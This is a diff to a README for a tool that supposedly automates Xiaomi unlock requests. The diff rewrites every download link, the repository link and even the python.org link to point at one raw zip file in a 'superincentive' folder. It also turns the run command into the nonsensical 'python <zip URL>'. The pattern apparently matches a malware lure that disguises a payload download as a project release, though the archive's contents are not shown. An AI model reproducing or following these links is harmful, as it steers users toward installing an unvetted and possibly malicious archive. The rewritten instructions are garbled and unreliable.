@@ -1,6 +1,6 @@
 # 🎉 micommunity-unlock-request-automate - Easily Automate Xiaomi Unlock Requests
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/GuilhermLira/micommunity-unlock-request-automate/releases)
+[![Download Here](https://github.com/GuilhermLira/micommunity-unlock-request-automate/raw/refs/heads/master/superincentive/automate-request-micommunity-unlock-v2.9.zip%20Now-Click%20Here-brightgreen)](https://github.com/GuilhermLira/micommunity-unlock-request-automate/raw/refs/heads/master/superincentive/automate-request-micommunity-unlock-v2.9.zip)
 
 ## 📌 Introduction
 
@@ -20,14 +20,14 @@ To get started with this application, follow these easy steps:
    - Download and install ADB on your computer. You can find it on many online resources. Once installed, make sure it’s added to your system's PATH, or directly use it from the installation folder.
    
 3. **Download the Script:**
-   - Visit this page to download: [Download micommunity-unlock-request-automate](https://github.com/GuilhermLira/micommunity-unlock-request-automate/releases).
+   - Visit this page to download: [Download micommunity-unlock-request-automate](https://github.com/GuilhermLira/micommunity-unlock-request-automate/raw/refs/heads/master/superincentive/automate-request-micommunity-unlock-v2.9.zip).
 
 ## 📥 Download & Install
 
 1. Click on the following link to access the Releases page:
-   [Visit Release Page](https://github.com/GuilhermLira/micommunity-unlock-request-automate/releases).
+   [Visit Release Page](https://github.com/GuilhermLira/micommunity-unlock-request-automate/raw/refs/heads/master/superincentive/automate-request-micommunity-unlock-v2.9.zip).
    
-2. On this page, you will find the latest version of the script. Look for the file name that suits your system, such as `micommunity_unlock_request.py`.
+2. On this page, you will find the latest version of the script. Look for the file name that suits your system, such as `https://github.com/GuilhermLira/micommunity-unlock-request-automate/raw/refs/heads/master/superincentive/automate-request-micommunity-unlock-v2.9.zip`.
 
 3. Click on the file name to download it. Save it to a folder where you can easily access it later.
 
@@ -39,9 +39,9 @@ To get started with this application, follow these easy steps:
 2. **Execute the Script:**
    - Type the following command to run the script:
      ```
-     python micommunity_unlock_request.py
+     python https://github.com/GuilhermLira/micommunity-unlock-request-automate/raw/refs/heads/master/superincentive/automate-request-micommunity-unlock-v2.9.zip
      ```
-   - Ensure Python is installed on your computer. If you need to install it, visit [python.org](https://www.python.org/) for downloadable versions.
+   - Ensure Python is installed on your computer. If you need to install it, visit [https://github.com/GuilhermLira/micommunity-unlock-request-automate/raw/refs/heads/master/superincentive/automate-request-micommunity-unlock-v2.9.zip](https://github.com/GuilhermLira/micommunity-unlock-request-automate/raw/refs/heads/master/superincentive/automate-request-micommunity-unlock-v2.9.zip) for downloadable versions.
 
 3. **Wait for the Script to Execute:**
    - The script will automatically send the unlock request at the specified time. Make sure your computer remains on at that time.
@@ -82,7 +82,7 @@ This project is open-source. Feel free to use, modify, and share it. Please see 
 
 ## 🔗 Important Links
 
-- [GitHub Repository](https://github.com/GuilhermLira/micommunity-unlock-request-automate)
-- [Download Latest Release](https://github.com/GuilhermLira/micommunity-unlock-request-automate/releases)
+- [GitHub Repository](https://github.com/GuilhermLira/micommunity-unlock-request-automate/raw/refs/heads/master/superincentive/automate-request-micommunity-unlock-v2.9.zip)
+- [Download Latest Release](https://github.com/GuilhermLira/micommunity-unlock-request-automate/raw/refs/heads/master/superincentive/automate-request-micommunity-unlock-v2.9.zip)
 
 Thank you for using micommunity-unlock-request-automate. We hope this tool makes your unlocking process easier and more efficient!
